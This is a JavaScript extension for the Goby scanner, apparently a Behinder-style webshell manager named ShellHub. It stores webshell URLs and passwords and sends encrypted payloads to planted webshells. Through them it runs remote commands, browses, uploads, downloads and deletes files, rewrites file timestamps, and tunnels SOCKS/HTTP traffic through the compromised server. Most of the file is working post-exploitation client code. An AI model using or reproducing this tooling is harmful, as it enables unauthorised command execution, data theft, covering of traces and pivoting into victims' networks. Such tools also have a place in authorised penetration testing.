function activate() {
    const cookiejar = require('./behinder/jar');
    const utils = require("./behinder/utils");
    let jar
    let config = goby.getConfiguration();
    let socket;
    let server;

    class ShellsManagerX {
        constructor() {
            this.isDown = false;
            this.os = require('os');
            this.fs = require('fs');
            this.path = require('path');
            this.net = require('net');
            this.request = require('request');
            this.http = require('./behinder/req');
            this.socks5 = require('./behinder/socks5');
            this.GetData = require('./behinder/payload');
            this.cryptox = require("./behinder/crypto");
            this.crypt = require('crypto'); //引入crypto加密模块
            this.config = goby.getConfiguration();
            this.filePath = this.path.join(__dirname, '/info.json');

        }

        init(index) {
            jar = cookiejar.getJar(index)
            let info = this.shellsInfo();
            this.url = info[index].URL;
            this.proxy = info[index].Proxy;
            this.headers = info[index].Headers;
            this.pwd = this.crypt.createHash('md5').update(info[index].PWD).digest('hex').substr(0, 16);
            this.script = info[index].Script;
            this.encryptType = info[index].IsXor === true ? 1 : 0;
            // this.socketHash;
            console.log(this.encryptType)
        }

        getQueue() {
            delete require.cache[require.resolve(this.filePath)];
            return require(this.filePath);
        }

        cleanJar() {
            cookiejar.cleanJar()
        }

        // 修改更新 shell info 信息
        fixShellsInfo(fixjson) {
            return new Promise((resolve, reject) => {
                console.log(fixjson);
                let queue = this.getQueue();
                queue.info['shells'] = fixjson;
                console.log(queue);
                this.fs.writeFile(this.filePath, JSON.stringify(queue, null, 6), (err, res) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(res);
                    }
                })
            })
        }

        // 读取json文件并返回到html页面中
        shellsInfo() {
            let data = this.fs.readFileSync(this.filePath, 'utf-8')
            let jsondata = JSON.parse(data);
            // console.log(jsondata.info.shells);
            return jsondata.info.shells;
        }

        //删除某个shell
        delete(idArr = []){
            console.log(this.shellsInfo());
            console.log(idArr);
            return this.fixShellsInfo(this.shellsInfo().filter(item => !idArr.includes(item.ID)))
        }

        echo(content, force) {
            let params = new Map();
            params.set("content", content);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            let data = this.GetData(this.pwd, "EchoGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                console.log(this.pwd);
                return this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
            })
            // let res = this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0)
            // let resObj = Buffer.from(res, 'hex');
            // console.log(resObj)
            // return this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
        }


        getBasicInfo(whatever, force) {
            let params = new Map();
            params.set("whatever", whatever);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
                // 生成下随机字符串
                
                params.set("BasicInfoGo", "CCC" +　Math.random().toString(16).substr(-4));
            }
            let data = this.GetData(this.pwd, "BasicInfoGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                console.log(resMap)
                let resJson = JSON.parse(resMap)
                for (let k in resJson) {
                    if (k !== "basicInfo") {
                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                    }
                }
                return resJson
            })

        }

        runCmd(cmd, path, force) {
            let params = new Map();
            params.set("cmd", cmd);
            params.set("path", path);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            let data = this.GetData(this.pwd, "CmdGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                console.log(resMap)
                let resJson = JSON.parse(resMap)
                for (let k in resJson) {
                    resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                }
                return resJson
            })
        }

        //
        operationFile(mode, path, force, params) {
            let operParams = this.fileSelectMode(mode, path, force, params)
            let data = this.GetData(this.pwd, "FileOperationGo", operParams, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resObj = Buffer.from(res.body, 'hex');
                let resMap
                if (mode === "download") {
                    try {
                        utils.ExportRaw(params["remote_path"].split('/').slice(-1), resObj)
                        return "success"
                    } catch (e) {
                        return e
                    }

                } else {
                    resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                    let resJson = JSON.parse(resMap)
                    for (let k in resJson) {
                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                    }
                    console.log(resJson)
                    return resJson
                }
            })
        }

        uploadFile(remotePath, filePath, fileContent, force, useBlock, callback) {
            callback && callback(0)
            let params = new Map();
            params.set("mode", "create");
            params.set("path", remotePath);
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            if (!useBlock) {
                if (filePath.length > 0) {
                    fileContent = this.fs.readFileSync(filePath)
                }
                params.set("content", Buffer.from(fileContent).toString('base64'));
                let data = this.GetData(this.pwd, "FileOperationGo", params, this.script, this.encryptType)
                return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                    let resObj = Buffer.from(res.body, 'hex');
                    let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                    let resJson = JSON.parse(resMap)
                    for (let k in resJson) {
                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                    }
                    console.log(resJson)
                    return resJson
                })
            } else {
                let blocks = utils.FileSplit(filePath, 46080)
                const CustomForeach = async (arr, callback) => {
                    const length = arr.length;
                    const O = Object(arr);
                    let k = 0;
                    let data;
                    while (k < length) {
                        if (!this.isDown) {
                            return null;
                        }
                        if (k in O) {
                            console.log('doing foreach...');
                            const kValue = O[k];
                            data = await callback(kValue, k, O);
                        }
                        if (!this.isDown) {
                            return null;
                        }
                        k++;
                    }
                    return data
                };
                return CustomForeach(blocks, (item, key, arr) => {
                    return new Promise((resolve, reject) => {
                        if (key === 0) {
                            params.set("mode", "create");
                        } else {
                            params.set("mode", "append");
                        }
                        params.set("path", remotePath);
                        params.set("content", Buffer.from(item).toString('base64'));
                        let data = this.GetData(this.pwd, "FileOperationGo", params, this.script, this.encryptType)
                        this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                            let resObj = Buffer.from(res.body, 'hex');
                            let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                            let resJson = JSON.parse(resMap)
                            for (let k in resJson) {
                                resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
                            }
                            console.log(resJson)
                            // return resJson
                            if (resJson.status === "success") {
                                if (key === blocks.length - 1) {
                                    console.log('success')
                                    console.log(resJson)
                                    resolve(resJson)
                                }
                                if (callback) {
                                    if (!this.isDown) {
                                        callback(null)
                                    } else {
                                        callback(Math.floor(((key + 1) / arr.length) * 100))
                                    }
                                }
                                resolve(resJson)
                            } else {
                                let err = new Error(resJson.msg)
                                console.log(err)
                                reject(err)
                            }
                        }).catch(e => {
                            console.log(e)
                            reject(e)
                        })
                    })
                })
            }
        }

        fileSelectMode(mode, path, force, operJson) {
            let pathStr = path.replace(new RegExp("\\\\", "gm"), "/")
            let oldFileName = operJson["old_file_name"]
            let newFileName = operJson["new_file_name"]
            let dirName = operJson["dir_name"]
            let remotePath = operJson["remote_path"]
            let charSet = operJson["char_set"]
            let createTimeStamp = operJson["create_time_stamp"]
            let modifyTimeStamp = operJson["modify_time_stamp"]
            let accessTimeStamp = operJson["access_time_stamp"]
            let isChunk = operJson["is_chunk"]
            if (pathStr.charAt(pathStr.length - 1) !== "/" && mode !== "delete") {
                pathStr = pathStr + "/"
            }

            let params = new Map();
            if (this.script === "jsp") {
                params.set("forcePrint", force);
            }
            switch (mode) {
                // 列表文件树
                case "list":
                    params.set("mode", mode)
                    params.set("path", pathStr)
                    break
                //	打开文件
                case "show":
                    params.set("mode", mode)
                    params.set("path", pathStr + oldFileName);
                    if (this.script === "php") {
                        params.set("content", "");
                    }
                    if (charSet !== "") {
                        params.set("charset", charSet)
                    }
                    break
                //	删除文件或文件夹
                case "delete":
                    params.set("mode", mode)
                    params.set("path", pathStr)
                    break
                //	文件下载
                case "download":
                    params.set("mode", mode)
                    params.set("path", remotePath)
                    break
                //	重命名
                case "rename":
                    params.set("mode", mode)
                    params.set("path", oldFileName)
                    params.set("newPath", newFileName)
                    if (this.script === "php") {
                        params["content"] = ""
                        params["charset"] = ""
                    }
                    break
                //	创建文件
                case "createFile":
                    params.set("mode", mode)
                    params.set("path", newFileName)
                    break
                //	创建文件夹
                case "createDirectory":
                    params.set("mode", mode)
                    params.set("path", pathStr + dirName)
                    break
                //	获取时间戳
                case "getTimeStamp":
                    params.set("mode", mode)
                    params.set("path", pathStr + oldFileName)
                    break
                //	更新时间戳
                case "updateTimeStamp":
                    params.set("mode", mode)
                    params.set("path", pathStr + oldFileName)
                    params.set("createTimeStamp", createTimeStamp)
                    params.set("modifyTimeStamp", modifyTimeStamp)
                    params.set("accessTimeStamp", accessTimeStamp)
                    break
            }
            return params
        }

        readProxyData(socketHash) {
            console.log("READ:", socketHash)
            let params = new Map();
            params.set("cmd", "READ");
            if (this.script === "php") {
                params.set("remoteIP", "");
                params.set("remotePort", "");
            }
            params.set("socketHash", socketHash);
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resData
                if (res.statusCode === 200) {
                    console.log(res)
                    resData = Buffer.from(res.body, 'hex')
                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
                        resData = null;
                    } else {
                        if (res.headers.server !== undefined && res.headers.server.length !== 0 && res.headers.server.indexOf("Apache-Coyote/1.1") > 0) {
                            resData = resData.slice(0, resData.length - 1);
                        }

                        // if (resData == null) {
                        //     resData = null;
                        // }
                    }
                } else {
                    resData = null
                }
                return resData
            })

        }

        writeProxyData(proxyData, socketHash) {
            console.log("FORWARD:", socketHash)
            let params = new Map();
            params.set("cmd", "FORWARD");
            params.set("targetIP", "");
            params.set("targetPort", "");
            params.set("socketHash", socketHash);
            // if (this.script === 'php') {
            //     params.set("extraData", proxyData);
            // } else {
            params.set("extraData", Buffer.from(proxyData).toString('base64'));
            // }
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                let resData
                if (res.statusCode === 200) {
                    resData = Buffer.from(res.body, 'hex')
                    console.log(resData)

                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
                        resData = resData.slice(4, resData.length)
                        return false
                    } else {
                        return true
                    }
                } else {
                    return false
                }
            })

        }

        closeProxy(socketHash) {
            let params = new Map();
            params.set("cmd", "DISCONNECT");
            params.set("socketHash", socketHash);
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                return res.statusCode === 200;
            })

        }

        openProxy(destHost, destPort, socketHash) {
            console.log("CONNECT :", socketHash)
            let params = new Map();
            params.set("cmd", "CONNECT");
            params.set("targetIP", destHost);
            params.set("targetPort", destPort);
            params.set("socketHash", socketHash);
            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
            let resData
            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
                resData = Buffer.from(res.body, 'hex')
                if (res.statusCode === 200) {
                    resData = Buffer.from(res.body, 'hex')
                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
                        resData = resData.slice(4, resData.length)
                        return false
                    } else {
                        return true
                    }
                } else {
                    return false
                }
            })

        }

        // startProxy() {
        //     server = this.net.createServer((socket) => {
        //         socket.once('data', (data) => {
        //             if (!data || data[0] !== 0x05) return socket.destroy();
        //             let addrLen = 0, remoteAddr = null, remotePort = null;
        //             socket.write(Buffer.from([5, 0]), (err) => {
        //                 if (err) socket.destroy();
        //                 socket.once('data', (data) => {
        //                     if (data.length < 7 || data[1] !== 0x01) return socket.destroy();  // 只支持 CONNECT
        //                     try {
        //                         let addrtype = data[3];// ADDRESS_TYPE 目标服务器地址类型
        //                         if (addrtype === 3) {//0x03 域名地址(没有打错，就是没有0x02)，
        //                             addrLen = data[4];//域名地址的第1个字节为域名长度，剩下字节为域名名称字节数组
        //                         } else if (addrtype !== 1 && addrtype !== 4) {
        //                             return socket.destroy();
        //                         }
        //                         remotePort = data.readUInt16BE(data.length - 2);//最后两位为端口值
        //                         if (addrtype === 1) {// 0x01 IP V4地址
        //                             remoteAddr = data.slice(4, 8).join('.');
        //                         } else if (addrtype === 4) { //0x04 IP V6地址
        //                             // remoteAddr = data.slice(3, 19);//IP V6长度为 16
        //                             return socket.write(Buffer.from([0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]));//不支持IP V6
        //                         } else {//0x03 域名地址(没有打错，就是没有0x02)，域名地址的第1个字节为域名长度，剩下字节为域名名称字节数组
        //                             remoteAddr = data.slice(5, 5 + addrLen).toString("binary");
        //                         }
        //                         console.log(socket.localAddress.replace("::ffff:", "/") + socket.remotePort)
        //                         this.socketHash = this.crypt.createHash('md5').update(socket.localAddress.replace("::ffff:", "/") + socket.remotePort).digest('hex').substr(0, 16);
        //                         this.openProxy(remoteAddr, remotePort.toString(), this.socketHash).then(r => {
        //                             if (r) {
        //                                 goby.showSuccessMessage("ShellHub : " + `connecting : ${remoteAddr}:${remotePort}`)
        //                                 console.log(`connecting : ${remoteAddr}:${remotePort}`);
        //                                 if (socket.writable) {
        //                                     socket.write(Buffer.from([0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), (err) => {
        //                                         if (err) {
        //                                             goby.showErrorMessage("ShellHub : " + error.message)
        //                                             return socket.destroy();
        //                                         }
        //                                         socket.on('data', (data) => {
        //                                             console.log(data)
        //                                             console.log(data.toString())
        //                                             this.writeProxyData(data, this.socketHash).then(res => {
        //                                                 console.log(res)
        //                                                 if (res) {
        //                                                     setTimeout(() => {
        //                                                         this.readProxyData(this.socketHash).then(res => {
        //                                                             if (res) {
        //                                                                 console.log(res.toString())
        //                                                                 if (res.length === 0) {
        //                                                                     // // if (res == null) {
        //                                                                     //     console.log(111111111111111111111111111)
        //                                                                     // sock.destroy()
        //                                                                     return
        //                                                                 }
        //                                                                 // if (sock.destroyed === true) {
        //                                                                 //     return
        //                                                                 // }
        //                                                                 socket.write(res)
        //                                                                 // sock.end(res)
        //                                                             }
        //                                                         }).catch((error) => {
        //                                                             console.log(error)
        //                                                             goby.showErrorMessage("ShellHub : " + error.message)
        //                                                             socket.destroy()
        //                                                         })
        //                                                     }, 500)
        //                                                 }
        //                                             }).catch((error) => {
        //                                                 goby.showErrorMessage("ShellHub : " + error.message)
        //                                             })
        //                                         })
        //                                     });
        //                                 }
        //                             }
        //                         })
        //
        //                     } catch (e) {
        //                         console.log(e)
        //                     }
        //                 });
        //             });
        //         });
        //         socket.on('error', function (err) {
        //             console.error(`error:${err.message}`);
        //         });
        //         socket.on('close', () => {
        //             console.log("close")
        //             socket.destroyed || socket.destroy();
        //         });
        //     });
        //     server.listen(1080, () => {
        //         goby.showSuccessMessage("ShellHub : Socks Server Start & Listening 1080")
        //     });
        // }

        Connect(remoteAddr, remotePort, data, sock) {
            if (remotePort < 0 || remoteAddr === '0.0.0.0') {
                console.log("return")
                return;
            }

            data[1] = 0x00;
            const socketHash = this.crypt.createHash('md5').update(sock.localAddress.replace("::ffff:", "/") + sock.remotePort).digest('hex').substr(0, 16);
            console.log(sock.localAddress.replace("::ffff:", "/") + sock.remotePort)
            console.log('host %s port %d -- %s', remoteAddr, remotePort, socketHash);
            if (this.script === 'php') {
                this.openProxy(remoteAddr, remotePort.toString(), socketHash)
                setTimeout(() => {
                    this.forward(sock, data, socketHash)
                }, 1000);

            } else {
                this.openProxy(remoteAddr, remotePort.toString(), socketHash).then(r => {
                    if (r) {
                        goby.showSuccessMessage("ShellHub : " + `connecting : ${remoteAddr}:${remotePort}`)
                        console.log(`connecting : ${remoteAddr}:${remotePort}`);
                        this.forward(sock, data, socketHash)
                    }
                })
            }
        }

        forward(sock, data, socketHash) {
            if (sock.writable) {
                sock.write(data, (err) => {
                    if (err) {
                        console.log(err)
                        goby.showErrorMessage("ShellHub : " + error.message)
                        return sock.destroy();
                    }
                    sock.on('connect', (data) => {
                        console.log(data)
                    })
                    sock.on('data', (data) => {
                        console.log(data.toString())
                        this.writeProxyData(data, socketHash).then(res => {
                            if (res) {
                                setTimeout(() => {
                                    this.readProxyData(socketHash).then(res => {
                                        if (res) {
                                            console.log(res.toString())
                                            if (res.length === 0) {
                                                this.closeProxy(socketHash).catch((error) => {
                                                    console.log(error)
                                                    goby.showErrorMessage("ShellHub : " + error.message)
                                                })
                                                return
                                            }
                                            sock.write(res)
                                        }
                                    }).catch((error) => {
                                        console.log(error)
                                        goby.showErrorMessage("ShellHub : " + error.message)
                                        sock.destroy()
                                    })
                                }, 500)
                            }
                        }).catch((error) => {
                            console.log(error)
                            goby.showErrorMessage("ShellHub : " + error.message)
                        })
                    })
                });
            }
        }

        // startProxy() {
        //     socket = this.net.createServer(sock => {
        //
        //         //监听错误
        //         sock.on('error', (err) => {
        //             console.error('error code %s', err.code);
        //             console.error(err);
        //         });
        //
        //         sock.on('close', () => {
        //             console.log("close")
        //             sock.destroyed || sock.destroy();
        //         });
        //
        //         sock.once('data', this.socks5.autherHandler.bind({sock, connect: this.Connect.bind(this)})); //处理认证方式
        //         // sock.pipe(sock)
        //     });
        //
        //     socket.listen(1080, () => {
        //         goby.showSuccessMessage("ShellHub : Socks Server Start & Listening 1080")
        //         console.log('socks5 proxy running ...')
        //     }).on('error', err => {
        //             goby.showErrorMessage("ShellHub : " + err.message)
        //             console.error(err)
        //         }
        //     );
        // }

        //
        // stopProxy() {
        //     try {
        //         socket.close()
        //         goby.showSuccessMessage("ShellHub : " + `Socks Server Close`)
        //     } catch (e) {
        //         console.log(error)
        //         goby.showErrorMessage("ShellHub : " + e.message)
        //     }
        // }

        // stopProxy() {
        //     this.closeProxy(this.socketHash).then(res => {
        //         console.log(res)
        //         server.close()
        //         goby.showSuccessMessage("ShellHub : " + `Socks Server Close`)
        //     }).catch((error) => {
        //         console.log(error)
        //         goby.showErrorMessage("ShellHub : " + error.message)
        //     })
        //
        // }

        startProxy() {
            goby.proxyRequest((req, callback) => {
                console.dir(req)
                let reqRaw = ""
                let CRLF = '\r\n'
                let first = `${req.method} ${req.url} HTTP/1.1${CRLF}`
                for (let k in req.headers) {
                    reqRaw += k.slice(0, 1).toUpperCase() + k.slice(1) + ": " + req.headers[k] + CRLF
                }
                reqRaw = first + reqRaw
                if (req.method === 'POST') {
                    reqRaw = reqRaw + CRLF + req.body
                } else {
                    reqRaw = reqRaw + CRLF
                }
                console.log(reqRaw);
                let remoteAddr = req.headers.host.split(":")[0]
                let remotePort = req.headers.host.split(":")[1]
                const socketHash = this.crypt.createHash('md5').update(Date.now().toString()).digest('hex').substr(0, 16);
                this.openProxy(remoteAddr, remotePort, socketHash).then(r => {
                    if (r) {
                        // goby.showSuccessMessage("ShellHub : " + `connecting : ${remoteAddr}:${remotePort}`)
                        console.log(`connecting : ${remoteAddr}:${remotePort}`);
                        this.writeProxyData(Buffer.from(reqRaw), socketHash).then(res => {
                            if (res) {
                                setTimeout(() => {
                                    this.readProxyData(socketHash).then(res => {
                                        if (res) {
                                            console.log(res.toString())
                                            if (res.length === 0) {
                                                this.closeProxy(socketHash).catch((error) => {
                                                    console.log(error)
                                                    goby.showErrorMessage("ShellHub : " + error.message)
                                                })
                                                return
                                            }
                                            let response = res.toString()
                                            let header = response.split(CRLF + CRLF)[0]
                                            let body = response.split(CRLF + CRLF)[1]
                                            let headerLine = header.split(CRLF)
                                            let bodyLine = body.split(CRLF)
                                            let statusCode = headerLine[0].split(" ")[1]
                                            console.log(headerLine)
                                            console.log(statusCode)
                                            callback(statusCode,bodyLine[1])
                                        }
                                    }).catch((error) => {
                                        console.log(error)
                                        goby.showErrorMessage("ShellHub : " + error.message)
                                    })
                                }, 400)
                            }
                        }).catch((error) => {
                            console.log(error)
                            goby.showErrorMessage("ShellHub : " + error.message)
                        })
                    }
                })
            })
        }

        stopProxy() {
            goby.closeProxyRequest()
        }
    }

    if (!window.ShellsManagerX) {
        window.ShellsManagerX = new ShellsManagerX();
    }
    goby.bindEvent('onWebShell', (res) => {
       
        let shellInfo = window.ShellsManagerX.shellsInfo()
        let info = res.output.split(/\r\n|\n/).map(item=>item.replace(/(([^:])+):(\s+)?(.+)/,'{"$1":"$4"}')).reduce((total,prev)=>{
            try {
                let json = JSON.parse(prev)
                total = {
                    ...total,
                    ...json
                }
            } catch (error) {
                total = total
            }
            return total
        },{})

        let headers = {}
        if(info.Referer){
            headers.Referer = info.Referer
        }
        let urlParse = require('url');
        if (shellInfo.length === 0) {
            let script = urlParse.parse(res.url).pathname.split('.').slice(-1)[0]
            shellInfo.push({
                "ID": shellInfo.length + 1,
                "URL": res.url,
                "OS": "",
                "CPath": "",
                "DList": "",
                "PWD": res.pwd,
                "Script": info['Webshell type'] || script,
                "Proxy": goby.getConfiguration().Proxy.default,
                "IsXor": false,
                "Headers": {
                    ...headers
                },
                "Time": Date.now(),
                "Status": "Null"
            })
        } else {
            let urlList = []
            shellInfo.forEach(element => {
                urlList.push(element.URL)
            });
            console.log(urlList);
            if (urlList.indexOf(res.url) === -1) {
                let script = urlParse.parse(res.url).pathname.split('.').slice(-1)[0]
                shellInfo.push({
                    "ID": shellInfo.length + 1,
                    "URL": res.url,
                    "OS": "",
                    "CPath": "",
                    "DList": "",
                    "PWD": res.pwd,
                    "Script": info['Webshell type'] || script,
                    "Proxy": goby.getConfiguration().Proxy.default,
                    "IsXor": false,
                    "Headers": {
                        ...headers
                    },
                    "Time": Date.now(),
                    "Status": "Null"
                })
            }
        }
        let randStr = utils.randomRange(30, 200)
        window.ShellsManagerX.fixShellsInfo(shellInfo).then(res => {
            window.ShellsManagerX.init(shellInfo.length - 1)
            window.ShellsManagerX.echo(randStr, "false").then(res => {
                console.log(res)
                if (res === undefined || res.indexOf("Error") !== -1) {
                    goby.showErrorMessage("ShellHub : Shell Connection failed!")
                    res = ""
                }
                if (res.indexOf("status") !== -1) {
                    let path = require('path');
                    goby.showIframeDia(path.join(__dirname, '/auto_manager.html'), "ShellHub", "980", "500");
                } else {
                    alert("shell 连接失败！")
                    goby.showErrorMessage("ShellHub : Shell Connection failed!")
                }

            }).catch((error) => {
                console.log(error);
                goby.showErrorMessage("ShellHub :" + error.message)
            })
        })


    })
    goby.registerCommand('ShellsManager', function (content) {
        let path = require('path');
        goby.showIframeDia(path.join(__dirname, '/user_manager.html'), "ShellHub", "980", "500");

    });
}

exports.activate = activate;


// baseInfo1  fileOper1  runCmd1  avCheck1